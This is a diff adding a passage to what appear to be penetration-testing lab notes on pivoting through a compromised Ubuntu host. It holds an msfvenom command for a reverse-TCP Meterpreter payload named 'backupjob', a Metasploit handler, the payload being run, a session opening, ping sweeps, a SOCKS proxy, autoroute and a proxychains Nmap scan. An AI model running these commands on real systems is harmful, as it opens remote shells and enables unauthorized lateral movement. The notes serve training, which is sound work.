@@ -359,4 +359,137 @@ This approach allows you to bypass firewall restrictions and scan the network be
      ```
 
 ---
+# Meterpreter Tunneling & Port Forwarding
+#### **Creating Payload for Ubuntu Pivot Host**
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+```
+- **Purpose**: Creates a Meterpreter reverse TCP payload for a Linux target (Ubuntu in this case).
+- **Explanation**: 
+  - `LHOST=10.10.14.18`: Set the attacker's local IP address.
+  - `LPORT=8080`: Set the listening port on the attacker's machine.
+  - `-f elf`: Specifies that the payload will be generated as an ELF executable.
+  - The output is saved as `backupjob`, which will be transferred to the pivot host for execution.
 
+#### **Configuring & Starting the multi/handler**
+```bash
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set lhost 0.0.0.0
+msf6 exploit(multi/handler) > set lport 8080
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > run
+```
+- **Purpose**: Configures and starts a Metasploit handler to listen for the incoming reverse connection from the payload.
+- **Explanation**:
+  - `set lhost 0.0.0.0`: Binds to all interfaces on the attacker's machine to receive the connection.
+  - `set lport 8080`: Specifies the port to listen on (must match the payload's `LPORT`).
+  - `run`: Starts the handler, waiting for the payload to connect back and establish a Meterpreter session.
+
+#### **Executing the Payload on Pivot Host**
+```bash
+ubuntu@WebServer:~$ ls
+backupjob
+ubuntu@WebServer:~$ chmod +x backupjob
+ubuntu@WebServer:~$ ./backupjob
+```
+- **Purpose**: Executes the payload (`backupjob`) on the pivot host to establish a Meterpreter session.
+- **Explanation**: 
+  - The payload is made executable using `chmod +x backupjob`.
+  - Then, it is executed to trigger the reverse TCP connection to the attacker's machine.
+
+#### **Meterpreter Session Established**
+```bash
+[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 )
+meterpreter > pwd
+/home/ubuntu
+```
+- **Purpose**: Confirms that the Meterpreter session has been successfully established.
+- **Explanation**: 
+  - `pwd`: Shows the current working directory of the session (`/home/ubuntu`), confirming access to the Ubuntu host.
+
+#### **Ping Sweep on Target Network (172.16.5.0/23)**
+```bash
+meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+```
+- **Purpose**: Performs a ping sweep across the specified target subnet to identify live hosts.
+- **Explanation**: 
+  - The `ping_sweep` post-exploitation module sends ICMP requests to all hosts in the `172.16.5.0/23` range and reports back the reachable IPs.
+
+#### **Ping Sweep for Loop (Linux Pivot)**
+```bash
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+```
+- **Purpose**: Executes a parallel ping sweep on the `172.16.5.0/23` network.
+- **Explanation**: 
+  - A for loop sends one ping request (`ping -c 1`) to each host from `172.16.5.1` to `172.16.5.254`.
+  - `grep "bytes from"` filters the output to show only successful replies.
+  - The `&` allows the pings to run in parallel for faster scanning.
+#### ping sweep powershell
+```
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
+```
+#### ping sweep cmd 
+```
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+```
+#### **SOCKS Proxy Configuration**
+```bash
+msf6 > use auxiliary/server/socks_proxy
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
+msf6 auxiliary(server/socks_proxy) > set version 4a
+msf6 auxiliary(server/socks_proxy) > run
+```
+- **Purpose**: Configures Metasploit's SOCKS proxy server to route traffic through the Meterpreter session.
+- **Explanation**: 
+  - `SRVPORT 9050`: Sets the local port for the SOCKS proxy (commonly used for Tor traffic).
+  - `SRVHOST 0.0.0.0`: Allows connections from any interface (so it's accessible to the attacker's machine).
+  - `version 4a`: Configures the SOCKS proxy to use SOCKS4a (commonly used with Metasploit).
+  - `run`: Starts the SOCKS proxy server.
+
+#### **Adding Proxy to proxychains.conf**
+```bash
+socks4  127.0.0.1 9050
+```
+- **Purpose**: Configures `proxychains` to route traffic through the SOCKS proxy.
+- **Explanation**: 
+  - Adds the proxy to the `/etc/proxychains.conf` file, allowing tools like Nmap to route their traffic via the SOCKS proxy server running on `127.0.0.1:9050`.
+
+#### **Creating Routes with AutoRoute**
+```bash
+msf6 > use post/multi/manage/autoroute
+msf6 post(multi/manage/autoroute) > set SESSION 1
+msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
+msf6 post(multi/manage/autoroute) > run
+```
+- **Purpose**: Configures Metasploit to route traffic from the attacker's machine through the compromised Ubuntu pivot host.
+- **Explanation**: 
+  - `SESSION 1`: Specifies the Meterpreter session to use for routing.
+  - `SUBNET 172.16.5.0`: Adds the target subnet `172.16.5.0/23` to the routing table, allowing traffic to be forwarded via the Meterpreter session.
+
+#### **Listing Active Routes**
+```bash
+meterpreter > run autoroute -p
+```
+- **Purpose**: Lists the active routes in the routing table, confirming the new routes for the target network.
+- **Explanation**: Displays the subnets and gateways that are accessible through the Meterpreter session.
+
+#### **Testing Proxy & Routing Functionality**
+```bash
+$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+```
+- **Purpose**: Uses `proxychains` to route an Nmap scan through the Meterpreter session and test network connectivity to the target.
+- **Explanation**: 
+  - The `-p3389` option scans port `3389` (RDP) on the target IP `172.16.5.19`.
+  - `-sT`: Performs a TCP connect scan.
+  - `-v`: Enables verbose output.
+  - `-Pn`: Disables host discovery (assumes the host is up).
+  
+**Output**:
+```bash
+Nmap scan report for 172.16.5.19 
+Host is up (0.12s latency).
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+```
+- **Explanation**: Nmap discovers that port `3389` (RDP) is open on `172.16.5.19`, indicating that the scan successfully routed through the Meterpreter session.
